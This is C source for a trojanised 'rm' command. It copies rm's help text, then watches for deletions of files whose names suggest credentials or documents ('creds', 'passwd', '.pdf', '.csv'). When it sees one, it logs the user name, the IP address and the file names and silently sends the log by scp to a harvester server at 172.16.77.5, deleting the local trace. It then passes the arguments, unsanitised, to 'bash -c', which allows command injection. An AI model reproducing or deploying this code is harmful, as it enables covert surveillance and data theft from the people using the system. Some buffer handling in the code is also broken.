#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <unistd.h>
#include <sys/types.h>
#include <pwd.h>
#include <string.h>
#include <errno.h>
#include <netdb.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <netinet/in.h>
#include <net/if.h>
#include <arpa/inet.h>
#define INTEREST_SIZE 6
void helppage(){
    char *rmhelp = "rm: missing operand\n"
    "Try 'rm --help' for more information.\n";
    printf("%s", rmhelp);
}
void extendedhelp(){
    system("/usr/bin/rm --help");
}
void sshsession(char *argv[], int argc){
    printf("In ssh session\n");
    //Creating password, filename, and time
    struct passwd *p = getpwuid(getuid());
    time_t t = time(NULL);
    struct tm tm = *localtime(&t);
    char date[250] = "";
    sprintf(date, "%d-%02d-%02d==%02d:%02d:%02d", tm.tm_year + 1900, tm.tm_mon + 1, tm.tm_mday, tm.tm_hour, tm.tm_min, tm.tm_sec);
    char filename[100] = "/dev/shm/negativerm-(";
    strcat(filename, date);
    strcat(filename,").har");
    printf("File created\n");
    //Getting ip address
    unsigned char ip_address[15];
    int fd;
    struct ifreq ifr;
        /*AF_INET - to define network interface IPv4*/
    /*Creating soket for it.*/
    fd = socket(AF_INET, SOCK_DGRAM, 0);

    /*AF_INET - to define IPv4 Address type.*/
    ifr.ifr_addr.sa_family = AF_INET;

    /*eth0 - define the ifr_name - port name
    where network attached.*/
    memcpy(ifr.ifr_name, "eth0", IFNAMSIZ - 1);

    /*Accessing network interface information by
    passing address using ioctl.*/
    ioctl(fd, SIOCGIFADDR, &ifr);
    /*closing fd*/
    close(fd);

    /*Extract IP Address*/
    strcpy(ip_address, inet_ntoa(((struct sockaddr_in*)&ifr.ifr_addr)->sin_addr));
    char printarg[250];
    FILE *fp;
    fp = fopen(filename, "w");
       for (int i = 1; i < argc; i++){
       strcat(printarg, argv[i]);
       strcat(printarg, " ");
   }
    fprintf(fp, "%s@%s: %s attempted to remove %s @%s\n", p->pw_name, ip_address, p->pw_name, printarg, date);
    fclose(fp);
    printf("Connecting to server\n");
    char command[500] = "/usr/bin/scp -q '";
    char dest[100] = "' pdiddy@172.16.77.5:/var/harvester";
    strcat(command, filename);
    strcat(command, dest);
    system(command);
    strcpy(command, "/usr/bin/rm '"); 
    strcat(command, filename);
    strcat(command, "'");
    system(command);
}
int compareFilename(char *interest_cred, char *argv){
    const char* cinterest_cred = interest_cred;
    const char* cargv = argv;
     if (strstr(cargv, cinterest_cred) == cinterest_cred) {
        return 0;
    }
    /*
    if (strstr(argv, interest_cred) == interest_cred) {
        return 0;
    }
    */
    return 1;
}

void grabber(char *argv[], int argc){
    /*
    * Interesting Filenames:
    * - creds
    * - passwd
    * - password
    * - .xlxs
    * - .pdf
    * - .csv
    */
   char *interest_creds[INTEREST_SIZE];
    interest_creds[0] = "creds";
    interest_creds[1] = "passwd";
    interest_creds[2] = "password";
    interest_creds[3] = ".xlxs";
    interest_creds[4] = ".pdf";
    interest_creds[5] = ".csv";
   char *command = "/usr/bin/bash ";
   /*
   char argvgetter[250] ="";
   for (int i = 1; i < argc; i++){
       strcat(argvgetter, argv[i]);
       strcat(argvgetter, " ");
   }
   printf("Comparing filename\n");
   for (int i = 0; i < INTEREST_SIZE; i++){
       if (compareFilename(interest_creds[i], argvgetter) == 0){
           printf("Entering sshsession\n");
           sshsession(argv, argc);
       }
   }
   */
    for (int i = 0; i < argc; i++){
        for (int j = 0; j < INTEREST_SIZE; j++){
               if (strstr(argv[i], interest_creds[j])){//checks what the user entered
                printf("Entering sshsession\n");
                sshsession(argv, argc);
            }
        }
    }
    char argvgetter[250] ="";
    strcat(argvgetter, command);
    strcat(argvgetter, " ");
    strcat (argvgetter, "-c '/usr/bin/rm ");
   for (int i = 1; i < argc; i++){
       strcat(argvgetter, argv[i]);
       strcat(argvgetter, " ");
   }
   strcat(argvgetter, "'");
   printf("argvgetter is %s", argvgetter);
   /*
   char *argready[2];
   argready[0] = argvgetter;
   char *callargv[] = {"-c /usr/bin/rm ", argready, NULL};
   execve(command, callargv, NULL);
   */
   system(argvgetter);
   exit(1);
}
int main(int argc, char *argv[]){
    if (argc == 1){
        helppage();
        exit(0);
    }
    if (strcmp(argv[1], "--help") == 0){
        extendedhelp();
        exit(0);
    }
    grabber(argv, argc);
    return 0;
}
